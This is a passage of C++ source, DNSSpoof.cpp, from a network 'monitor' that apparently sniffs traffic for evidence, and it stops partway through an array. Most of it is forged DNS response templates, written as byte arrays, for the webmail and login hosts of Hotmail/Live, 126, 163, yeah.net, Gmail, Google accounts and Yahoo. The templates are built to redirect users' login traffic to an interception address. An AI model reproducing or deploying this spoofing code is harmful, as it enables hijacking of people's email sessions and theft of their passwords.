//------------------------------------------------------------------------
// Nodes Monitor System is a sniffer to get evidences on Internet.
//
// Copyright (C) 2008 BAIHONG Information Security Techology CO., Ltd.
//
//------------------------------------------------------------------------
//
// Module Name:     DNSSpoof.cpp
//
//------------------------------------------------------------------------
// Notes:
//      This file define the functions of class DNSSpoof.
//------------------------------------------------------------------------
// Change Activities:
// tag  Reason   Ver  Rev Date   Origin      Description
// ---- -------- ---- --- ------ ----------- -----------------------------
// $d0= -------- 1.0  001 100527  wu zhonghua Initial
//
//------------------------------------------------------------------------
#include <sys/types.h>
#include <iostream>
#include <libnet.h>
#include <string.h>

#include "DNSSpoof.h"
#include "DNSutil.h"
#include "siteSwitch.h"
#include "Analyzer_log.h"
//#include "httpsAdapterInfo.h"

#define EC_MAGIC_16  0xe77e
#define NS_MAXDNAME	1025
#define INDIR_MASK	0xc0
#define NS_INT16SZ	2
#define NS_GET16(s, cp) do { \
	register u_char *t_cp = (u_char *)(cp); \
	(s) = ((u_int16_t)t_cp[0] << 8) \
	    | ((u_int16_t)t_cp[1]) \
	    ; \
	(cp) += NS_INT16SZ; \
} while (0)
#define MAX_ASCII_ADDR_LEN   sizeof("ffff:ffff:ffff:ffff:ffff:ffff:255.255.255.255")+1
#define IP_ADDR_LEN      4

#define DNS_MAIL_LIVE	(1|SWITCH_MSN)
#define DNS_HOTMAIL	(2|SWITCH_MSN)
#define DNS_WLIVE	(3|SWITCH_MSN)
#define DNS_LLIVE	(4|SWITCH_MSN)
#define DNS_SHMAIL	(5|SWITCH_MSN)
#define DNS_HOMEL	(6|SWITCH_MSN)

#define DNS_W126	(11|SWITCH_WANGYI)
#define DNS_M126	(12|SWITCH_WANGYI)
#define DNS_M163	(13|SWITCH_WANGYI)
#define DNS_EM163	(14|SWITCH_WANGYI)
#define DNS_WYEAH	(15|SWITCH_WANGYI)
#define DNS_MYEAH	(16|SWITCH_WANGYI)
#define DNS_S126	(17|SWITCH_WANGYI)
#define DNS_EM126	(18|SWITCH_WANGYI)
#define DNS_EMYEAH	(19|SWITCH_WANGYI)
#define DNS_YEAH	(20|SWITCH_WANGYI)
#define DNS_SSLY	(25|SWITCH_WANGYI)
#define DNS_SSL163	(26|SWITCH_WANGYI)
#define DNS_SSL126	(27|SWITCH_WANGYI)
#define DNS_W163		(28|SWITCH_WANGYI)

#define DNS_MG		(21|SWITCH_GOOGLE)
#define DNS_WG		(22|SWITCH_GOOGLE)
#define DNS_GMG		(23|SWITCH_GOOGLE)
#define DNS_ACCT  	(24|SWITCH_GOOGLE)
#define DNS_WGH  	(25|SWITCH_GOOGLE)

#define DNS_QQMAIL 	(31|SWITCH_QQ)
#define DNS_MAILQQ 	(32|SWITCH_QQ)
#define DNS_WMAILQQ 	(33|SWITCH_QQ)

#define DNS_YCNFORM 	(41|SWITCH_YAHOO)
#define DNS_YCNLOGIN    (42|SWITCH_YAHOO)
#define DNS_YLOGIN 	(43|SWITCH_YAHOO)
#define DNS_WYAHOO 	(44|SWITCH_YAHOO)
#define DNS_CNYAHOO 	(45|SWITCH_YAHOO)
#define DNS_YFORM 	(46|SWITCH_YAHOO)

#define DNS_SOHU_MAIL 	(80|SWITCH_SOHU)
#define DNS_SOHU_LOGIN 	(81|SWITCH_SOHU)

#define DNS_HANMAIL_WWW      (71|SWITCH_HANMAIL)
#define DNS_HANMAIL_MAIL     (72|SWITCH_HANMAIL)
#define DNS_HANMAIL_LOGINS   (73|SWITCH_HANMAIL)
#define DNS_HANMAIL_JS       (74|SWITCH_HANMAIL)
#define DNS_HANMAIL_LOGIN    (75|SWITCH_HANMAIL)

#define DNS_SINA_LOGIN       (91|SWITCH_SINA)
#define DNS_SINA_SSO         (92|SWITCH_SINA)
#define DNS_SINA_JS          (93|SWITCH_SINA)
#define DNS_SINA_IJS         (94|SWITCH_SINA)

#define DNS_DOMAIN_LIMIT 82

#define TIMA 0x00
#define TIMB 0x00
#define TIMC 0x02
#define TIMD 0x58

#define DNS_OTHER 30

unsigned int reservedCheckSum[DNS_DOMAIN_LIMIT];
int initSumFlag=0;
int domainFlag=0;
int answerRRS=0;
int udpSum=0;
//mail.live.com
unsigned char mlive[119]={
	0x04,0x6d,0x61,0x69,0x6c,0x04,0x6c,0x69,0x76,0x65,0x03,0x63,0x6f,0x6d,0x00,0x00,
	0x01,0x00,0x01,
	0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x23,0x08,0x74,0x6f,0x70,
	0x6c,0x65,0x76,0x65,0x6c,0x04,0x6d,0x61,0x69,0x6c,0x04,0x6c,0x69,0x76,0x65,0x03,
	0x63,0x6f,0x6d,0x06,0x61,0x6b,0x61,0x64,0x6e,0x73,0x03,0x6e,0x65,0x74,0x00,0xc0,
	0x2b,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x09,0x06,0x6f,0x72,0x69,0x67,
	0x69,0x6e,0xc0,0x0c,0xc0,0x5a,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,
	0x00,0x00,0x00,0x00,0xc0,0x5a,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,
	0x00,0x00,0x00,0x00
};
//www.hotmail.com
unsigned char hmail[115]={
0x03,0x77,0x77,0x77,0x07,0x68,0x6f,0x74,0x6d,0x61,0x69,0x6c,0x03,0x63,0x6f,0x6d,
0x00,0x00,0x01,0x00,0x01,
0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x23,0x08,0x74,0x6f,0x70,
0x6c,0x65,0x76,0x65,0x6c,0x04,0x6d,0x61,0x69,0x6c,0x04,0x6c,0x69,0x76,0x65,0x03,
0x63,0x6f,0x6d,0x06,0x61,0x6b,0x61,0x64,0x6e,0x73,0x03,0x6e,0x65,0x74,0x00,0xc0,
0x2d,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x13,0x06,0x6f,0x72,0x69,0x67,
0x69,0x6e,0x04,0x6d,0x61,0x69,0x6c,0x04,0x6c,0x69,0x76,0x65,0xc0,0x18,0xc0,0x5c,
0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};
//www.126.com  *** #
unsigned char w126[160]={
0x03,0x77,0x77,0x77,0x03,0x31,0x32,0x36,0x03,0x63,0x6f,0x6d,0x00,0x00,0x01,0x00,
0x01,
0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x12,0x06,0x6d,0x63,0x61,
0x63,0x68,0x65,0x04,0x6d,0x61,0x69,0x6c,0x03,0x31,0x36,0x33,0xc0,0x14,0xc0,0x29,
0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x16,0x05,0x65,0x6d,0x61,0x69,0x6c,
0x03,0x31,0x36,0x33,0x03,0x63,0x6f,0x6d,0x05,0x6c,0x78,0x64,0x6e,0x73,0xc0,0x14,
0xc0,0x47,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x10,0x03,0x31,0x36,0x33,
0x07,0x78,0x78,0x63,0x61,0x63,0x68,0x65,0x01,0x7a,0xc0,0x55,0xc0,0x69,0x00,0x05,
0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x17,0x05,0x30,0x36,0x38,0x31,0x31,0x09,0x78,
0x64,0x77,0x73,0x63,0x61,0x63,0x68,0x65,0x04,0x67,0x6c,0x62,0x30,0xc0,0x55,0xc0,
0x85,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00		
};
//mail.126.com  *** #
unsigned char m126[179]={
0x04,0x6d,0x61,0x69,0x6c,0x03,0x31,0x32,0x36,0x03,0x63,0x6f,0x6d,0x00,0x00,0x01,
0x00,0x01,

0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x06,0x03,0x77,0x77,0x77,
0xc0,0x11,0xc0,0x2a,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x12,0x06,0x6d,
0x63,0x61,0x63,0x68,0x65,0x04,0x6d,0x61,0x69,0x6c,0x03,0x31,0x36,0x33,0xc0,0x15,
0xc0,0x3c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x16,0x05,0x65,0x6d,0x61,
0x69,0x6c,0x03,0x31,0x36,0x33,0x03,0x63,0x6f,0x6d,0x05,0x6c,0x78,0x64,0x6e,0x73,
0xc0,0x15,0xc0,0x5a,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x10,0x03,0x31,
0x36,0x33,0x07,0x78,0x78,0x63,0x61,0x63,0x68,0x65,0x01,0x7a,0xc0,0x68,0xc0,0x7c,
0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x17,0x05,0x30,0x36,0x38,0x31,0x31,
0x09,0x78,0x64,0x77,0x73,0x63,0x61,0x63,0x68,0x65,0x04,0x67,0x6c,0x62,0x30,0xc0,
0x68,0xc0,0x98,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,
0x00
};
//email.126.com  *** #
unsigned char em126[162]={
0x05,0x65,0x6d,0x61,0x69,0x6c,0x03,0x31,0x32,0x36,0x03,0x63,0x6f,0x6d,0x00,0x00,
0x01,0x00,0x01,
0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x12,0x06,0x6d,0x63,0x61,
0x63,0x68,0x65,0x04,0x6d,0x61,0x69,0x6c,0x03,0x31,0x36,0x33,0xc0,0x16,0xc0,0x2b,
0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x16,0x05,0x65,0x6d,0x61,0x69,0x6c,
0x03,0x31,0x36,0x33,0x03,0x63,0x6f,0x6d,0x05,0x6c,0x78,0x64,0x6e,0x73,0xc0,0x16,
0xc0,0x49,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x10,0x03,0x31,0x36,0x33,
0x07,0x78,0x78,0x63,0x61,0x63,0x68,0x65,0x01,0x7a,0xc0,0x57,0xc0,0x6b,0x00,0x05,
0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x17,0x05,0x30,0x36,0x38,0x31,0x31,0x09,0x78,
0x64,0x77,0x73,0x63,0x61,0x63,0x68,0x65,0x04,0x67,0x6c,0x62,0x30,0xc0,0x57,0xc0,
0x87,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
}; 

//mail.163.com	***#
unsigned char m163[152]={
0x04,0x6d,0x61,0x69,0x6c,0x03,0x31,0x36,0x33,0x03,0x63,0x6f,0x6d,0x00,0x00,0x01,
0x00,0x01,
0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x09,0x06,0x6d,0x63,0x61,
0x63,0x68,0x65,0xc0,0x0c,0xc0,0x2a,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,
0x16,0x05,0x65,0x6d,0x61,0x69,0x6c,0x03,0x31,0x36,0x33,0x03,0x63,0x6f,0x6d,0x05,
0x6c,0x78,0x64,0x6e,0x73,0xc0,0x15,0xc0,0x3f,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,
TIMD,0x00,0x10,0x03,0x31,0x36,0x33,0x07,0x78,0x78,0x63,0x61,0x63,0x68,0x65,0x01,
0x7a,0xc0,0x4d,0xc0,0x61,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x17,0x05,
0x30,0x36,0x38,0x31,0x31,0x09,0x78,0x64,0x77,0x73,0x63,0x61,0x63,0x68,0x65,0x04,
0x67,0x6c,0x62,0x30,0xc0,0x4d,0xc0,0x7d,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,
0x00,0x04,0x00,0x00,0x00,0x00

};
//email.163.com  ***#
unsigned char em163[158]={
0x05,0x65,0x6d,0x61,0x69,0x6c,0x03,0x31,0x36,0x33,0x03,0x63,0x6f,0x6d,0x00,0x00,
0x01,0x00,0x01,
0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x0e,0x06,0x6d,0x63,0x61,
0x63,0x68,0x65,0x04,0x6d,0x61,0x69,0x6c,0xc0,0x12,0xc0,0x2b,0x00,0x05,0x00,0x01,
TIMA,TIMB,TIMC,TIMD,0x00,0x16,0x05,0x65,0x6d,0x61,0x69,0x6c,0x03,0x31,0x36,0x33,
0x03,0x63,0x6f,0x6d,0x05,0x6c,0x78,0x64,0x6e,0x73,0xc0,0x16,0xc0,0x45,0x00,0x05,
0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x10,0x03,0x31,0x36,0x33,0x07,0x78,0x78,0x63,
0x61,0x63,0x68,0x65,0x01,0x7a,0xc0,0x53,0xc0,0x67,0x00,0x05,0x00,0x01,TIMA,TIMB,
TIMC,TIMD,0x00,0x17,0x05,0x30,0x36,0x38,0x31,0x31,0x09,0x78,0x64,0x77,0x73,0x63,
0x61,0x63,0x68,0x65,0x04,0x67,0x6c,0x62,0x30,0xc0,0x53,0xc0,0x83,0x00,0x01,0x00,
0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};

//www.yeah.net ***
unsigned char wyeah[164]={
0x03,0x77,0x77,0x77,0x04,0x79,0x65,0x61,0x68,0x03,0x6e,0x65,0x74,0x00,0x00,0x01,
0x00,0x01,

0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x15,0x06,0x6d,0x63,0x61,
0x63,0x68,0x65,0x04,0x6d,0x61,0x69,0x6c,0x03,0x31,0x36,0x33,0x03,0x63,0x6f,0x6d,
0x00,0xc0,0x2a,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x16,0x05,0x65,0x6d,
0x61,0x69,0x6c,0x03,0x31,0x36,0x33,0x03,0x63,0x6f,0x6d,0x05,0x6c,0x78,0x64,0x6e,
0x73,0xc0,0x3a,0xc0,0x4b,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x10,0x03,
0x31,0x36,0x33,0x07,0x78,0x78,0x63,0x61,0x63,0x68,0x65,0x01,0x7a,0xc0,0x59,0xc0,
0x6d,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x17,0x05,0x30,0x36,0x38,0x31,
0x31,0x09,0x78,0x64,0x77,0x73,0x63,0x61,0x63,0x68,0x65,0x04,0x67,0x6c,0x62,0x30,
0xc0,0x59,0xc0,0x89,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,
0x00,0x00
};

//mail.yeah.net  ***
unsigned char myeah[183]={
0x04,0x6d,0x61,0x69,0x6c,0x04,0x79,0x65,0x61,0x68,0x03,0x6e,0x65,0x74,0x00,0x00,
0x01,0x00,0x01,

0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x06,0x03,0x77,0x77,0x77,
0xc0,0x11,0xc0,0x2b,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x15,0x06,0x6d,
0x63,0x61,0x63,0x68,0x65,0x04,0x6d,0x61,0x69,0x6c,0x03,0x31,0x36,0x33,0x03,0x63,
0x6f,0x6d,0x00,0xc0,0x3d,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x16,0x05,
0x65,0x6d,0x61,0x69,0x6c,0x03,0x31,0x36,0x33,0x03,0x63,0x6f,0x6d,0x05,0x6c,0x78,
0x64,0x6e,0x73,0xc0,0x4d,0xc0,0x5e,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,
0x10,0x03,0x31,0x36,0x33,0x07,0x78,0x78,0x63,0x61,0x63,0x68,0x65,0x01,0x7a,0xc0,
0x6c,0xc0,0x80,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x17,0x05,0x30,0x36,
0x38,0x31,0x31,0x09,0x78,0x64,0x77,0x73,0x63,0x61,0x63,0x68,0x65,0x04,0x67,0x6c,
0x62,0x30,0xc0,0x6c,0xc0,0x9c,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,
0x00,0x00,0x00,0x00
};
//email.yeah.net ***
unsigned char emyeah[166]={
0x05,0x65,0x6d,0x61,0x69,0x6c,0x04,0x79,0x65,0x61,0x68,0x03,0x6e,0x65,0x74,0x00,
0x00,0x01,0x00,0x01,

0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x15,0x06,0x6d,0x63,0x61,
0x63,0x68,0x65,0x04,0x6d,0x61,0x69,0x6c,0x03,0x31,0x36,0x33,0x03,0x63,0x6f,0x6d,
0x00,0xc0,0x2c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x16,0x05,0x65,0x6d,
0x61,0x69,0x6c,0x03,0x31,0x36,0x33,0x03,0x63,0x6f,0x6d,0x05,0x6c,0x78,0x64,0x6e,
0x73,0xc0,0x3c,0xc0,0x4d,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x10,0x03,
0x31,0x36,0x33,0x07,0x78,0x78,0x63,0x61,0x63,0x68,0x65,0x01,0x7a,0xc0,0x5b,0xc0,
0x6f,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x17,0x05,0x30,0x36,0x38,0x31,
0x31,0x09,0x78,0x64,0x77,0x73,0x63,0x61,0x63,0x68,0x65,0x04,0x67,0x6c,0x62,0x30,
0xc0,0x5b,0xc0,0x8b,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,
0x00,0x00
};
//SSL.MAIL.163.COM
unsigned char ssl163[38]={
0x03,0x73,0x73,0x6c,0x04,0x6d,0x61,0x69,0x6c,0x03,0x31,0x36,0x33,0x03,0x63,0x6f,
0x6d,0x00,0x00,0x01,0x00,0x01,
0xc0,0x0c,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00 

};
//SSL.126
unsigned char ssl126[38]={
0x03,0x73,0x73,0x6c,0x04,0x6d,0x61,0x69,0x6c,0x03,0x31,0x32,0x36,0x03,0x63,0x6f,
0x6d,0x00,0x00,0x01,0x00,0x01,
0xc0,0x0c,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};


//yeah.net ***
unsigned char yeah[30]={
0x04,0x79,0x65,0x61,0x68,0x03,0x6e,0x65,0x74,0x00,0x00,0x01,0x00,0x01,
0xc0,0x0c,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};

//www.163.com
unsigned char w163[161]={
0x03,0x77,0x77,0x77,0x03,0x31,0x36,0x33,0x03,0x63,0x6f,0x6d,0x00,0x00,0x01,0x00,
0x01,
0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x1b,0x03,0x77,0x77,0x77,
0x05,0x63,0x61,0x63,0x68,0x65,0x06,0x77,0x61,0x6e,0x67,0x73,0x75,0x07,0x6e,0x65,
0x74,0x65,0x61,0x73,0x65,0xc0,0x14,0xc0,0x29,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,
TIMD,0x00,0x14,0x03,0x77,0x77,0x77,0x03,0x31,0x36,0x33,0x03,0x63,0x6f,0x6d,0x05,
0x6c,0x78,0x64,0x6e,0x73,0xc0,0x14,0xc0,0x50,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,
TIMD,0x00,0x0c,0x03,0x77,0x77,0x77,0x03,0x31,0x36,0x33,0x01,0x7a,0xc0,0x5c,0xc0,
0x70,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x15,0x03,0x31,0x36,0x33,0x09,
0x78,0x64,0x77,0x73,0x63,0x61,0x63,0x68,0x65,0x04,0x67,0x6c,0x62,0x30,0xc0,0x5c,
0xc0,0x88,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};


//login.live.com
unsigned char llive[74]={
0x05,0x6c,0x6f,0x67,0x69,0x6e,0x04,0x6c,0x69,0x76,0x65,0x03,0x63,0x6f,0x6d,0x00,
0x00,0x01,0x00,0x01,
0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x1a,0x05,0x6c,0x6f,0x67,
0x69,0x6e,0x04,0x6c,0x69,0x76,0x65,0x03,0x63,0x6f,0x6d,0x05,0x6e,0x73,0x61,0x74,
0x63,0x03,0x6e,0x65,0x74,0x00,0xc0,0x2c,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,
0x00,0x04,0x00,0x00,0x00,0x00
};

//www.live.com
unsigned char wlive[78]={
0x03,0x77,0x77,0x77,0x04,0x6c,0x69,0x76,0x65,0x03,0x63,0x6f,0x6d,0x00,0x00,0x01,
0x00,0x01,
0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x20,0x04,0x68,0x6f,0x6d,
0x65,0x06,0x77,0x6c,0x78,0x72,0x65,0x64,0x04,0x6c,0x69,0x76,0x65,0x03,0x63,0x6f,
0x6d,0x05,0x6e,0x73,0x61,0x74,0x63,0x03,0x6e,0x65,0x74,0x00,0xc0,0x2a,0x00,0x01,
0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};

//hotmail.com
unsigned char shmail[33]={
0x07,0x68,0x6f,0x74,0x6d,0x61,0x69,0x6c,0x03,0x63,0x6f,0x6d,0x00,0x00,0x01,0x00,
0x01,
0xc0,0x0c,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x04,0x00,0x00
};
//home.live.com
unsigned char homel[79]={
0x04,0x68,0x6f,0x6d,0x65,0x04,0x6c,0x69,0x76,0x65,0x03,0x63,0x6f,0x6d,0x00,0x00,
0x01,0x00,0x01,
0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x20,0x04,0x68,0x6f,0x6d,
0x65,0x06,0x77,0x6c,0x78,0x72,0x65,0x64,0x04,0x6c,0x69,0x76,0x65,0x03,0x63,0x6f,
0x6d,0x05,0x6e,0x73,0x61,0x74,0x63,0x03,0x6e,0x65,0x74,0x00,0xc0,0x2b,0x00,0x01,
0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};



//126.com
unsigned char s126[29]={
0x03,0x31,0x32,0x36,0x03,0x63,0x6f,0x6d,0x00,0x00,0x01,0x00,0x01,
0xc0,0x0c,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};


//ssl.mail.yeah.net
unsigned char sslyeah[39]={
0x03,0x73,0x73,0x6c,0x04,0x6d,0x61,0x69,0x6c,0x04,0x79,0x65,0x61,0x68,0x03,0x6e,
0x65,0x74,0x00,0x00,0x01,0x00,0x01,0xc0,0x0c,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,
TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};


//www.google.com
unsigned char wg[56]={
0x03,0x77,0x77,0x77,0x06,0x67,0x6f,0x6f,0x67,0x6c,0x65,0x03,0x63,0x6f,0x6d,0x00,
0x00,0x01,0x00,0x01,
0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x08,0x03,0x77,0x77,0x77,
0x01,0x6c,0xc0,0x10,0xc0,0x2c,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,
0x00,0x00,0x00,0x00
};

//www.google.com.hk
unsigned char wgh[69]={
0x03,0x77,0x77,0x77,0x06,0x67,0x6f,0x6f,0x67,0x6c,0x65,0x03,0x63,0x6f,0x6d,0x02,0x68,0x6b,0x00,0x00,0x01,0x00,0x01,
0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x12,0x03,0x77,0x77,0x77,0x01,0x6c,0x06,0x67,0x6f,0x6f,0x67,0x6c,0x65,0x03,0x63,0x6f,0x6d,0x00,
0xc0,0x2f,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};

//mail.google.com
unsigned char mg[64]={
0x04,0x6d,0x61,0x69,0x6c,0x06,0x67,0x6f,0x6f,0x67,0x6c,0x65,0x03,0x63,0x6f,0x6d,
0x00,0x00,0x01,0x00,0x01,
0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x0f,0x0a,0x67,0x6f,0x6f,
0x67,0x6c,0x65,0x6d,0x61,0x69,0x6c,0x01,0x6c,0xc0,0x11,0xc0,0x2d,0x00,0x01,0x00,
0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};

//gmail.google.com
unsigned char gmg[84]={
0x05,0x67,0x6d,0x61,0x69,0x6c,0x06,0x67,0x6f,0x6f,0x67,0x6c,0x65,0x03,0x63,0x6f,
0x6d,0x00,0x00,0x01,0x00,0x01,
0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x09,0x04,0x77,0x77,0x77,
0x33,0x01,0x6c,0xc0,0x12,0xc0,0x2e,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,
0x0d,0x0a,0x77,0x77,0x77,0x33,0x2d,0x63,0x68,0x69,0x6e,0x61,0xc0,0x33,0xc0,0x43,
0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};

//account.google.com
unsigned char accounts[66]={
0x08,0x61,0x63,0x63,0x6f,0x75,0x6e,0x74,0x73,0x06,0x67,0x6f,0x6f,0x67,0x6c,0x65,
0x03,0x63,0x6f,0x6d,0x00,0x00,0x01,0x00,0x01,0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,
TIMB,TIMC,TIMD,0x00,0x0d,0x08,0x61,0x63,0x63,0x6f,0x75,0x6e,0x74,0x73,0x01,0x6c,
0xc0,0x15,0xc0,0x31,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,
0x00,0x00
};

//mail.cn.yahoo.com
unsigned char cnformyahoo[69]={
	0x04,0x6d,0x61,0x69,0x6c,0x02,0x63,0x6e,0x05,0x79,0x61,0x68,0x6f,0x6f,0x03,0x63,
	0x6f,0x6d,0x00,0x00,0x01,0x00,0x01,
	0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x12,0x02,0x63,0x6e,0x04,
	0x6d,0x61,0x69,0x6c,0x03,0x76,0x69,0x70,0x03,0x63,0x6e,0x62,0xc0,0x14,
	0xc0,0x2f,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};

//edit.bjs.yahoo.com
unsigned char cnloginyahoo[70]={
	0x04,0x65,0x64,0x69,0x74,0x03,0x62,0x6a,0x73,0x05,0x79,0x61,0x68,0x6f,0x6f,0x03,
	0x63,0x6f,0x6d,0x00,0x00,0x01,0x00,0x01,
	0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x12,0x02,0x63,0x6e,0x04,
	0x65,0x64,0x69,0x74,0x03,0x76,0x69,0x70,0x03,0x63,0x6e,0x62,0xc0,0x15,
	0xc0,0x30,0x00,0x01,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x00,0x00,0x00,0x00
};

//login.yahoo.com
unsigned char loginyahoo[96]={
	0x05,0x6c,0x6f,0x67,0x69,0x6e,0x05,0x79,0x61,0x68,0x6f,0x6f,0x03,0x63,0x6f,0x6d,
	0x00,0x00,0x01,0x00,0x01,
	0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x16,0x0c,0x6c,0x6f,0x67,
	0x69,0x6e,0x2d,0x67,0x6c,0x6f,0x62,0x61,0x6c,0x04,0x6c,0x67,0x67,0x31,0x01,0x62,
	0xc0,0x12,0xc0,0x2d,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x0d,0x05,0x6c,
	0x6f,0x67,0x69,0x6e,0x04,0x6c,0x67,0x61,0x31,0xc0,0x3f,0xc0,0x4f,0x00,0x01,0x00,
	0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x04,0x42,0xa3,0xa9,0xba
};

//www.yahoo.com
unsigned char wyahoo[99]={
	0x03,0x77,0x77,0x77,0x05,0x79,0x61,0x68,0x6f,0x6f,0x03,0x63,0x6f,0x6d,0x00,0x00,
	0x01,0x00,0x01,
	0xc0,0x0c,0x00,0x05,0x00,0x01,TIMA,TIMB,TIMC,TIMD,0x00,0x0b,0x02,0x66,0x70,0x03,
